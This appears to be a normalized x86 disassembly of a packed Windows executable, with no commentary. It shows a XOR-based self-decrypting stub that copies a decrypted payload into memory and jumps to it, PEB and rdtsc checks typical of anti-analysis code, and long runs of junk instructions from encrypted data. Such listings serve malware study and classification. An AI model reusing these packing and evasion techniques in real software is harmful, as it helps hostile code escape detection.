mov [ esp + 0x48 ] 0x0
[ edi ]
stosb [ edi ]
mov edi rwxdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x4c ]
push rwxdata
push ecx
call [ sprintf@IAT ]
mov eax [ esp + 0x2c ]
add esp 0xc
inc esi
mov edx [ eax ]
mov eax [ ebx + edx ]
cmp esi [ eax + ebp * 4 ]
jl rwxdata
mov ecx [ ebp ]
mov edx [ esi + ecx ]
mov [ edx + edi * 4 ] 0x32
mov eax [ ebp ]
mov ecx [ esi + eax ]
mov edx [ ecx + edi * 4 ]
shl edx 0x2
push edx
call [ malloc@IAT ]
mov ecx [ ebx ]
add esp 0x4
mov edx [ esi + ecx ]
mov [ edx + edi * 4 ] eax
mov ecx [ ebp ]
xor eax eax
mov edx [ esi + ecx ]
cmp [ edx + edi * 4 ] 0x0
jle rwxdata
mov ecx [ ebx ]
inc eax
mov edx [ esi + ecx ]
mov ecx [ edx + edi * 4 ]
mov [ ecx + eax * 4 - 0x4 ] 0x32
mov edx [ ebp ]
mov ecx [ esi + edx ]
cmp eax [ ecx + edi * 4 ]
jl rwxdata
mov eax [ esp + 0x18 ]
xor esi esi
cmp [ ebx + eax ] 0x0
jle rwxdata
mov ecx [ esp + 0x38 ]
push ecx
call ebp
mov edx [ esp + 0x30 ]
push edx
call ebp
mov eax [ esp + 0x3c ]
push eax
call ebp
mov ecx [ esp + 0x48 ]
push ecx
call ebp
mov ecx [ esp + 0x40 ]
add esp 0x10
call sub_403ee0
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x34 ]
mov eax [ ecx + edx ]
mov ecx [ eax + esi * 4 ]
push ecx
call ebp
mov edx [ esp + 0x14 ]
lea eax [ edx + ebx ]
mov eax [ edx + ebx ]
mov ecx [ eax + esi * 4 ]
push ecx
call ebp
mov edx [ esp + 0x20 ]
add esp 0x8
inc esi
cmp esi [ ebx + edx ]
jl rwxdata
mov edx [ esp + 0x10 ]
lea eax [ edx + ebx ]
mov eax [ edx + ebx ]
mov ecx [ eax + esi * 4 ]
mov edx [ ecx + edi * 4 ]
push edx
call ebp
mov eax [ ebx ]
add esp 0x4
inc edi
cmp edi [ eax + esi * 4 ]
jl rwxdata
mov eax [ esp + 0x20 ]
xor esi esi
mov edx [ eax ]
mov eax [ ebx + edx ]
cmp [ eax + ebp * 4 ] 0x0
jle rwxdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x10 ]
sub_403ee0
mov cl [ rwxdata ]
push esi
push edi
xor eax eax
mov dl [ eax + rwxdata ]
sub dl 0x5
xor dl cl
mov [ eax + rwxdata ] dl
inc eax
cmp eax 0x14b9
jbe rwxdata
mov cl [ rwxdata ]
xor eax eax
mov dl [ eax + rwxdata ]
xor dl cl
mov [ eax + rwxdata ] dl
inc eax
cmp eax 0x14b9
jbe rwxdata
mov ecx 0x52e
mov esi rwxdata
mov edi sub_409bb4
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea eax [ sub_409bb4 ]
add eax 0x25
call eax
push 0x0
call [ ExitProcess@IAT ]
sub_4043d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb rwxdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae rwxdata
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rwxdata ] 0xffffffff
or [ rwxdata ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rwxdata ] eax
call sub_404585
cmp [ rwxdata ] ebx
jne rwxdata
call sub_404570
push rwxdata
push rwxdata
call _initterm
mov eax [ rwxdata ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rwxdata ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rwxdata
push rwxdata
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne rwxdata
push sub_404582
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je rwxdata
mov al [ esi ]
cmp al bl
je rwxdata
inc esi
mov [ ebp - 0x74 ] esi
jmp rwxdata
cmp [ esi ] 0x22
jne rwxdata
cmp al 0x22
jne rwxdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je rwxdata
cmp al 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_404592
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4045aa
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne rwxdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_40495d
sbb al 0x17
cli
cwde
xchg ecx eax
xchg ecx eax
rcr [ edi + edx ] 0xd4
nop
xchg ecx eax
xchg ecx eax
shr [ esi + 0x7 ] 0x6c
xchg ecx eax
xchg ecx eax
xchg ecx eax
jns rwxdata
cmp esp [ edx - 0x2ed3e3af ]
xchg ecx eax
xchg ecx eax
xchg ecx eax
out 0xe2 al
mov [ 0xffffffff91a3a2ce ] eax
leave
shr [ esi + 0x7 ] 0xc
xchg ecx eax
add [ eax ] al
js rwxdata
xchg ecx eax
xchg ecx eax
js rwxdata
xchg ecx eax
xchg ecx eax
xchg ecx eax
xchg ecx eax
jo rwxdata
sbb ch bh
mov cl 0x1a
cmpsd [ esi ] [ edi ]
adc dh ch
popfd
mov [ 0xffffffffe491a391 ] al
jle rwxdata
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmc
sbb ah [ ecx + 0x1a919191 ]
out 0x9d eax
sbb ah bh
lea ebx [ edx ]
[ ecx + edx * 4 + 0x7d1ac491 ]
adc [ ebp - 0x5f ] dl
imul ebp [ esi + 0x6e ] 0x1a
pushfd
xchg ecx eax
xchg ecx eax
les ebx [ edx ]
jge rwxdata
xchg ecx eax
xchg ecx eax
sbb [ edi ] dl
push edx
fwait
xchg ecx eax
xchg ecx eax
jns rwxdata
and eax 0x4091901f
sar [ eax - 0x706e7b13 ] 0x1
sub bh [ ebp - 0xc ]
mov [ ecx + 0x7b7cc99d ] dl
mov [ ecx - 0x311043f0 ] ss
xchg esp eax
xchg ecx eax
sub esi [ ebx - 0x6e63591f ]
sbb edi [ ecx - 0x53 ]
jmp rwxdata
popad
outsb
outsb
sub ch dl
xchg ecx eax
xchg ecx eax
xchg ecx eax
bound edi [ ebx ]
push esi
adc al 0x3c
pushad
outsb
outsb
jbe rwxdata
sub ch ah
add al 0xae
push 0x6e
outsb
push edx
les ebx [ edx ]
jge rwxdata
sti
xchg ecx eax
outsb
pop es
adc al 0x91
xchg ecx eax
xchg ecx eax
sbb [ edi ] dl
push esp
cdq
xchg ecx eax
xchg ecx eax
outsb
pop es
sbb [ ecx + 0x26ac9191 ] dl
xchg ecx eax
xchg ecx eax
xchg ecx eax
in al 0x95
pop eax
push ebx
xchg ebp eax
xchg ecx eax
xchg ecx eax
in al 0x99
sbb al 0x17
push 0xffffff92
push ebp
mov eax [ 0x1a6e6e6b ]
xchg ecx eax
sar ebx 0x91
sahf
xchg ecx eax
xchg ecx eax
bound edi [ ebx ]
mov [ 0xffffffffd12c1c51 ] al
push ebp
mov eax [ 0xfffffffff16e6e61 ]
mov [ 0x152c1c51 ] al
popad
outsb
outsb
sub_404c03
outsb
pop es
js rwxdata
nop
xchg ecx eax
xchg ecx eax
sti
sbb [ esp + edx ] 0x6e6e6fc9
shr [ esi - 0x1c ] 0x6d
outsb
xchg ecx eax
xchg ecx eax
adc [ edi ] ebp
jle rwxdata
xchg ecx eax
xchg ecx eax
nop
sahf
adc al 0x1e
xchg ecx eax
xchg ecx eax
xchg ecx eax
shr [ esi - 0x39 ] 0x84
sbb al 0x2c
test al 0x6d
outsb
outsb
push edi
xchg esi eax
xchg ebp eax
push edi
salc
nop
nop
neg [ eax ]
salc
xchg ebx eax
sbb al 0x14
shr [ ebp + 0x6e ] 0x1
outsb
shr [ esi - 0x39 ] 0x88
adc ch [ ecx + 0x6e ]
in al 0x84
sbb al 0x14
shr [ ebp + 0x6e ] 0x1
outsb
shr [ esi - 0x39 ] 0x8c
adc al 0x51
in eax 0x1a
sbb dl cl
popfd
sbb dl [ ecx - 0x29e76ee6 ]
xchg ebp eax
push edi
salc
cdq
xchg ecx eax
sti
cwde
sub_404c76
outsb
pop es
je rwxdata
jle rwxdata
xchg ecx eax
xchg ecx eax
adc al 0x51
sahf
adc eax 0x91919058
adc esi ebp
nop

xchg ecx eax
xchg ecx eax
nop
sahf
adc al 0x1e
xchg ecx eax
xchg ecx eax
xchg ecx eax
shr [ esi - 0x39 ] 0x84
sbb al 0x2c
test al 0x6d
outsb
outsb
push edi
xchg esi eax
xchg ebp eax
push edi
salc
nop
nop
neg [ eax ]
salc
xchg ebx eax
sbb al 0x14
shr [ ebp + 0x6e ] 0x1
outsb
shr [ esi - 0x39 ] 0x88
adc ch [ ecx + 0x6e ]
in al 0x84
sbb al 0x14
shr [ ebp + 0x6e ] 0x1
outsb
shr [ esi - 0x39 ] 0x8c
adc al 0x51
in eax 0x1a
sbb dl cl
popfd
sbb dl [ ecx - 0x29e76ee6 ]
xchg ebp eax
push edi
salc
cdq
xchg ecx eax
sti
cwde
sub_404dab
insd
sub cl dl
xchg ecx eax
xchg ecx eax
xchg ecx eax
sbb al 0x24
movsd [ edi ] [ esi ]
push 0x6e
outsb
sbb al 0x2c
movsd [ edi ] [ esi ]
imul ebp [ esi + 0x6e ] 0x62
in eax 0x9c
iretd
sub_404e7e
sbb ah ah
cdq
sbb ch ah
sbb [ edx ] 0x43a29ddc
mov [ 0x12971b51 ] al
push edi
nop
stosb [ edi ]
pop ebx
in eax 0x9b
xchg edx eax
popad
adc dl [ edi - 0x6e ]
adc dl [ ebx - 0x70 ]
jpe rwxdata
outsb
pop es
or [ ecx + 0x69129191 ] dl
xchg ecx eax
out 0x8f eax
sti
xchg ecx eax
outsb
in al 0x89
outsb
in al 0x85
outsb
in al 0x81
adc ch ah
sbb bl [ ecx + 0x12 ]
push 0x1b9ee591
xchg edi eax
sbb [ esi + 0x12905712 ] edx
push esi
nop
adc bh [ eax - 0x70 ]
jpe rwxdata
popfd
xchg ecx eax
in al 0x94
outsb
mov [ eax - 0x38916d86 ] 0x9069129c
in al dx
xchg esi eax
in al dx
push edi
xchg esi eax
xchg ecx eax
sahf
daa
xchg edi eax
sahf
fist [ es : eax + 0x5358cfce ]
popfd
xchg ecx eax
les ebx [ edx ]
jge rwxdata
xchg ecx eax
xchg ecx eax
xchg ecx eax
outsb
in al 0x81
push ds
adc al 0x69
outsd
outsb
outsb
push esi
adc al 0x7d
outsd
outsb
outsb
and eax 0x56919191
adc al 0x61
outsd
outsb
outsb
xchg ecx eax
xchg ecx eax
xchg ecx eax
xchg ecx eax
mov [ 0x69d41851 ] al
sbb ah dl
insd
adc ch ah
popfd
xchg ecx eax
in al 0x8e
sbb al 0x14
jge rwxdata
push ebp
jge rwxdata
popfd
outsb
outsb
sar ebx 0x91
sti
xchg ecx eax
sbb al 0x14
outsd
outsb
outsb
sar ebx 0x91
xchg edx eax
outsb
outsb
outsb
int1
sbb ah ah
cdq
push esi
adc al 0x65
outsd
outsb
outsb
nop
sbb dl [ edi + 0x1a9dd492 ]
loope rwxdata
rcr [ edx ] 0xd4
and [ edx - 0x52d0fcbd ] 0x92919191
in al 0x9d
adc dl [ edi - 0x77 ]
xchg edx eax
in al 0x9d
sbb dl [ edi + 0x127dd418 ]
push edi
xchg ebp eax
sbb al 0xec
imul edi [ edx + edx * 4 ] 0x183a9dd4
aam 0x69
cmp al 0x92
aam 0x9d
sar [ edx ] 0x18
aam 0x65
sbb dl [ edi + 0x189dd492 ]
aam 0x61
iretd
sub_404f44
mov [ 0xffffffff85535851 ] al
xchg ecx eax
nop
aam 0x85
nop
aam 0x69
mov eax 0xec1289d4
mov [ ecx + 0x1af036e4 ] edx
aam 0x69
pop eax
push ebx
test [ ecx + 0x127d1ac4 ] edx
push ebp
jge rwxdata
adc [ edx ] 0xe4919dec
xchg esp eax
outsb
mov [ eax - 0x38916d86 ] 0x9069129c
in al dx
xchg esi eax
retn 0xc3c6
sub_404fad
push esi
aam 0x6d
xchg ecx eax
xchg ecx eax
xchg ecx eax
xchg ecx eax
sbb dl ah
insd
test al 0xd4
jge rwxdata
sar [ edx ] 0x18
aam 0x65
sbb dl [ edi + 0x189dd492 ]
aam 0x61
iretd
0xcbc851a2 0xcace
iretd
sub_404fd7
mov edx 0xa26dc36a
pop eax
fcomp [ edx ]
inc eax
mov [ 0x3d4aa251 ] al
mov [ 0x1b5c1b50 ] eax
jpo rwxdata
inc edx
fsubrp st4
inc esp
inc bx
inc ax
sbb dl [ ebx + 0x50 ]
push ecx
xor edi 0xaacb501a
inc ecx
in eax 0x9b
iretd
inc edi
daa
cdq
test [ eax + 0x7a ] 0xe24940f7
cwde
mul [ ecx + esi * 4 + 0x6210f712 ]
sub [ edi + ebp * 2 + 0x5f ] edi
in al 0x7a
mov [ 0xffffffffde42a259 ] al
in al 0x44
sub_405048
push ebx
popfd
xchg ecx eax
sbb ch [ esi - 0x3c ]
sbb bh [ ebp - 0xf ]
sbb ah ah
cdq
sbb ch ah
popfd
adc dl [ esi - 0x2f ]
sub [ ecx + 0x6d919191 ] bl
bound esi [ edx + ebx ]
salc
jno rwxdata
salc
cdq
sbb dh cl
popfd
into
jne rwxdata
cwde
nop
xchg ecx eax
xchg ecx eax
sbb dl [ esi - 0x5d6a39e6 ]
salc
popad
mov [ 0xffffffffd71865c6 ] al
inc bx
inc ax
sbb dl [ ebx + 0x50 ]
push ecx
xor edi 0xaacb501a
inc ecx
in eax 0x9b
salc
popad
mov [ 0xffffffff961865ce ] al
sbb dh cl
xchg ebp eax
sbb dl dh
jns rwxdata
cdq
sbb bh al
popfd
sbb dl dh
cdq
sbb al dh
popfd
mov [ 0xffffffffc6a269d6 ] al
insd
sbb bh dl
sbb [ eax ] 0x541285c7
cdq
adc dl [ edi - 0x67 ]
adc dl [ esi - 0x77 ]
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x1a919190 ] ebx
in eax dx
mov ch 0xbd
sbb ah [ esi + 0x12 ]
push edi
shr [ eax ] 0x1
adc [ ecx - 0x61c36e6f ] 0x78123a59
nop
in al 0x66
sbb al 0xef
inc ecx
sub [ ebp + 0x12919191 ] dl
jg rwxdata
aad 0xb5
mov eax [ 0xffffffff9098016e ]
xchg ecx eax
xchg ecx eax
adc dl [ ecx + ebx * 4 + 0x16 ]
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x1a919190 ] ebx
xchg esi eax
sbb al dh
xchg ebp eax
mov [ 0xffffffffc6a261d6 ] al
sbb bh dl
bound esi [ edx ]
dec edx
sbb dl ch
mov ch 0xa1
sbb bl [ ecx ]
mov [ eax + 0x279e9191 ] dl
movsd [ edi ] [ esi ]
0x9084191a 0x9191
sahf
daa
test [ edx - 0x424a1a6e ] ebx
outsb
add [ eax + edx * 4 + 0x56129191 ] ebx
cdq
sbb dl ch
mov ch 0xa1
sbb bl [ ecx ]
mov [ eax + 0x279e9191 ] dl
in eax 0x9a
nop
sbb bl [ ecx ]
test [ eax + 0x279e9191 ] dl
lds ebx [ edx - 0x4a1a6d70 ]
mov ebp 0x909c016e
xchg ecx eax
xchg ecx eax
adc dl [ edx - 0x6d ]
adc dl [ esi - 0x67 ]
adc ch [ edx - 0x71 ]
in eax dx
cmp eax 0xed1a51a2
mov ch 0xbd
sub [ ecx + 0x62919191 ] al
cmp dh al
pop eax
push ebx
popfd
pop ebp
add [ edx ] ebx
daa
jmp rwxdata
into
jge rwxdata
xchg ecx eax
les ebx [ edx ]
jge rwxdata
adc [ ecx + 0x3a629191 ] 0x9d5358f0
insd
sbb ch ah
popfd
sbb ah ah
cdq
sbb bh ah
adc [ edx ] 0x961ad154
sbb al dh
xchg ebp eax
mov [ 0xffffffffc4a291d4 ] al
xchg ebp eax
sbb [ edi + 0x1a95c718 ] dl
salc
cdq
sbb al dh
popfd
mov [ 0xffffffffc4a299d4 ] al
popfd
sbb bh dl
cdq
sbb bh al
popfd
sbb al 0xef
cdq
adc dl [ ecx + eax * 4 + 0x1a ]
aad 0xb5
movsd [ edi ] [ esi ]
sbb cl [ ecx ]
adc [ eax - 0x6dd86e6f ] 0x23
xchg edx eax
sbb dl ch
mov ch 0xa5
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
sbb dl ch
mov ch 0xa5
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
adc [ ebx - 0x70 ] di
in al 0x4c
sbb dl [ edi - 0x4d6223e6 ]
aam 0x91
0x599e9ddf 0xdfa2
cdq
inc eax
push ecx
sbb bh bl
cdq
sahf
pop ecx
mov dl 0xdc
cdq
mov [ 0x589e95d7 ] al
sbb bh dl
xchg ebp eax
inc eax
push eax
0x589e95d4 0x97a0
mov al [ 0x54129ddf ]
adc [ ecx ] 0x34e4907f
and edx [ edx - 0x5a4a2ae6 ]
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
sbb dl ch
mov ch 0xa5
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
adc [ ebx - 0x70 ] di
in al 0x4c
sbb dl [ edi + 0x1a95cf1a ]
fistp [ ecx - 0x5d6238e6 ]
aam 0x99
mov [ 0xffffffffdca29dcc ] al
xchg ecx eax
mov [ 0xffffffff9f1895c4 ] al
sbb bh al
xchg ebp eax
sbb bh dl
cdq
sbb bh cl
popfd
iretd
sbb ah [ esi + 0x79 ]
mov eax [ 0x31919191 ]
maskmovq mm5 mm6
stosb [ edi ]
salc
imul esp [ edx - 0x29e79232 ] 0x9dce1899
sub_405097
leave
fnstsw [ ebx ]
loop rwxdata
cdq
sbb dl ch
mov ch 0xa1
sbb cl [ ecx ]
adc [ eax + 0x16e9191 ] 0x98
nop
xchg ecx eax
xchg ecx eax
adc dl [ ecx + ebx * 4 + 0x16 ]
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x1a919190 ] ebx
salc
jno rwxdata
push edi
jle rwxdata
mov ch 0xa1
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
0x58cf
mov esi 0x2f13de78
lds ebp [ esi - 0x3e ]
xor al 0x60
inc edx
dec [ ebp + 0x6bb67481 ]
dec edi
stc
mov esp 0x19c7218c
push ebx
and dh [ edi + 0x50 ]
insb
int3
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x1a919190 ] ebx
xchg esi eax
sbb al dh
xchg ebp eax
mov [ 0xffffffffc6a261d6 ] al
sbb bh dl
cdq
sbb bh al
popfd
sbb dl dh
cdq
sbb al dh
popfd
mov [ 0xffffffffc6a269d6 ] al
insd
sbb bh dl
sbb [ eax ] 0x541285c7
cdq
adc dl [ edi - 0x67 ]
adc dl [ esi - 0x77 ]
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
sbb dl ch
mov ch 0xa1
outsb
add [ eax + 0x1a919190 ] ebx
in eax dx
mov ch 0xbd
sbb ah [ esi + 0x12 ]
push edi
shr [ eax ] 0x1
adc [ ecx - 0x61c36e6f ] 0x78123a59
nop
in al 0x66
sbb al 0xef
inc ecx
sub [ ebp + 0x12919191 ] dl
jg rwxdata
aad 0xb5
mov eax [ 0xffffffff9098016e ]
xchg ecx eax
xchg ecx eax
adc dl [ ecx + ebx * 4 + 0x16 ]
bound esi [ edx ]
dec edx
sbb dl ch
mov ch 0xa1
sbb bl [ ecx ]
mov [ eax + 0x279e9191 ] dl
movsd [ edi ] [ esi ]
0x9084191a 0x9191
sahf
daa
test [ edx - 0x424a1a6e ] ebx
outsb
add [ eax + edx * 4 + 0x56129191 ] ebx
cdq
sbb dl ch
mov ch 0xa1
sbb bl [ ecx ]
mov [ eax + 0x279e9191 ] dl
in eax 0x9a
nop
sbb bl [ ecx ]
test [ eax + 0x279e9191 ] dl
lds ebx [ edx - 0x4a1a6d70 ]
mov ebp 0x909c016e
xchg ecx eax
xchg ecx eax
adc dl [ edx - 0x6d ]
adc dl [ esi - 0x67 ]
adc ch [ edx - 0x71 ]
in eax dx
cmp eax 0xed1a51a2
mov ch 0xbd
sub [ ecx + 0x62919191 ] al
cmp dh al
pop eax
push ebx
popfd
xchg ecx eax
les ebx [ edx ]
jge rwxdata
adc [ ecx + 0x3a629191 ] 0x9d5358f0
insd
sbb ch ah
popfd
sbb ah ah
cdq
sbb bh ah
adc [ edx ] 0x961ad154
sbb al dh
xchg ebp eax
mov [ 0xffffffffc4a291d4 ] al
xchg ebp eax
sbb [ edi + 0x1a95c718 ] dl
salc
cdq
sbb al dh
popfd
mov [ 0xffffffffc4a299d4 ] al
popfd
sbb bh dl
cdq
sbb bh al
popfd
sbb al 0xef
cdq
adc dl [ ecx + eax * 4 + 0x1a ]
aad 0xb5
movsd [ edi ] [ esi ]
sbb cl [ ecx ]
adc [ eax - 0x6dd86e6f ] 0x23
xchg edx eax
sbb dl ch
mov ch 0xa5
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
sbb dl ch
mov ch 0xa5
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
adc [ ebx - 0x70 ] di
in al 0x4c
sbb dl [ edi - 0x4d6223e6 ]
aam 0x91
0x599e9ddf 0xdfa2
cdq
inc eax
push ecx
sbb bh bl
cdq
sahf
pop ecx
mov dl 0xdc
cdq
mov [ 0x589e95d7 ] al
sbb bh dl
xchg ebp eax
inc eax
push eax
0x589e95d4 0x97a0
mov al [ 0x54129ddf ]
adc [ ecx ] 0x34e4907f
and edx [ edx - 0x5a4a2ae6 ]
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
sbb dl ch
mov ch 0xa5
outsb
add [ eax + 0x12919190 ] ebx
push esp
cdq
push ss
adc [ ebx - 0x70 ] di
in al 0x4c
sbb dl [ edi + 0x1a95cf1a ]
fistp [ ecx - 0x5d6238e6 ]
aam 0x99
mov [ 0xffffffffdca29dcc ] al
xchg ecx eax
mov [ 0xffffffff9f1895c4 ] al
sbb bh al
xchg ebp eax
sbb bh dl
cdq
sbb bh cl
popfd
sub_405581
sar [ ecx + 0x582aea42 ] 0x1
rcl [ eax - 0x7c ] cl
jb rwxdata
mov cl 0x91
xchg ecx eax
mov eax [ 0x7d1ac4a1 ]
mov eax 0x1a99e41a
cmovo ebx [ ecx + 0x1f1a9191 ]
inc esp
cdq
xchg ecx eax
xchg ecx eax
sbb al [ 0xffffffff919948a2 ]
xchg ecx eax
sbb dl [ 0xffffffff91994ca2 ]
xchg ecx eax
push eax
push ebx
adc [ eax + 0x51 ] 0x8a
xchg edx eax
add eax 0x919948a0
xchg ecx eax
xchg edx eax
adc eax 0x91994ca0
xchg ecx eax
sbb [ 0xffffffff919948a2 ] dl
xchg ecx eax
sbb [ 0xffffffff91994ca2 ] al
xchg ecx eax
adc bh [ edx - 0x67 ]
loop rwxdata
out 0x56 al
adc [ edi ] ecx
sahf
ficomp [ esi - 0x70307022 ]
iretd
sub dl [ ecx ]
xchg ecx eax
xchg ecx eax
xchg ecx eax
adc bh [ eax - 0x67 ]
loop rwxdata
and [ ecx - 0x4e6e6e5f ] 0x819191b1
and [ ecx - 0x4e6e6e5f ] 0xb18181b1
sub [ ecx ] dl
xchg ecx eax
xchg ecx eax
xchg ecx eax
sbb [ edi ] cl
inc eax
cdq
xchg ecx eax
xchg ecx eax
sbb [ edi ] bl
inc esp
cdq
xchg ecx eax
xchg ecx eax
enter 0x58cf 0x53
xchg ebp eax
xchg ecx eax
retn 0xf1a
sub_4055ac
mov esi 0x8181befe
mov cl 0xb1
add [ ecx - 0x6e6e5e5f ] 0x9191b1b1
add [ ecx - 0x6e6e5e5f ] 0x8181b1b1
mov cl 0xb1
xchg ecx eax
sub dl [ ecx ]
xchg ecx eax
xchg ecx eax
xchg ecx eax
adc bh [ eax - 0x67 ]
loop rwxdata
xchg ecx eax
mov eax [ 0x7d1ac4a1 ]
mov eax 0x1a99e41a
cmovo ebx [ ecx + 0x1f1a9191 ]
inc esp
cdq
xchg ecx eax
xchg ecx eax
sbb al [ 0xffffffff919948a2 ]
xchg ecx eax
sbb dl [ 0xffffffff91994ca2 ]
xchg ecx eax
push eax
push ebx
adc [ eax + 0x51 ] 0x8a
xchg edx eax
add eax 0x919948a0
xchg ecx eax
xchg edx eax
adc eax 0x91994ca0
xchg ecx eax
sbb [ 0xffffffff919948a2 ] dl
xchg ecx eax
sbb [ 0xffffffff91994ca2 ] al
xchg ecx eax
adc bh [ edx - 0x67 ]
loop rwxdata
and [ ecx - 0x4e6e6e5f ] 0x819191b1
and [ ecx - 0x4e6e6e5f ] 0xb18181b1
mov cl 0x91
sub [ ecx ] dl
xchg ecx eax
xchg ecx eax
xchg ecx eax
sbb [ edi ] cl
inc eax
cdq
xchg ecx eax
xchg ecx eax
sbb [ edi ] bl
inc esp
cdq
xchg ecx eax
xchg ecx eax
enter 0x58cf 0x53
xchg ebp eax
xchg ecx eax
retn 0xf1a
sub_40571f
cmc
out 0xf0 eax
loope rwxdata
xchg ecx eax
xchg ecx eax
mov [ 0x46e91a3 ] al
mov al 0x60
outsb
outsb
sbb [ esi + eax * 8 ] dl
push 0x6e
outsb
jns rwxdata
pop ss
inc esp
cdq
xchg ecx eax
xchg ecx eax
rcl [ ecx - 0x33866e6f ] 0x6e
outsb
outsb
xchg ecx eax
xchg ecx eax
xchg ecx eax
jmp ebp
sub_405bc1
push esi
stc
in al 0xfe
mov edi 0xfef7fff8
xchg ecx eax
rcl [ ecx - 0x6e6a6fe3 ] 0x90
xchg ecx eax
xchg ecx eax
xchg ecx eax
push eax
xchg ebx eax
xchg ebp eax
xchg ecx eax
outsb
outsb
outsb
outsb
aam 0x90
cdq
xchg ecx eax
cld
hlt
sub_407265
push ebp
mov ebp esp
add esp 0xfffff030
pushad
xor eax eax
lea edi [ ebp - 0xf7c ]
mov ecx 0xf74
[ edi ]
xor eax eax
lea edi [ ebp - 0xfc0 ]
mov ecx 0x44
[ edi ]
mov [ ebp - 0xe53 ] 0xe7
jmp rwxdata
lea esi [ ebp - 0xf7c ]
rdtsc
xchg edx eax
xor ecx ecx
imul eax eax 0xac564b05
add eax 0x1
mov [ esi + ecx * 4 + 0x8d9 ] eax
add ecx 0x1
cmp ecx 0x22
jb rwxdata
fld1
fstp [ esi + 0x961 ]
mov [ esi + 0x8d1 ] 0x0
mov [ esi + 0x8d5 ] 0x50
call sub_407fab
push edi
mov edi 0x1e
call sub_407fab
sub edi 0x1
jne rwxdata
pop edi
mov eax [ fs : 0x30 ]
mov eax [ esp + 0x1c ]
sub eax 0x25
call eax
nop
nop
nop
nop
nop
nop
nop
push 0x4134d1ad
push [ ebp - 0x4c1 ]
push 0x0
call sub_4078d5
mov [ ebp - 0xedf ] eax
call sub_40809b
popad
jbe rwxdata
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
jo rwxdata
idiv bh
call [ ebx + 0x6a ]
add bh bh
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
inc ebx
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
xor esi [ edx ]
add bh bh
xchg ebp eax
and ecx esi
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
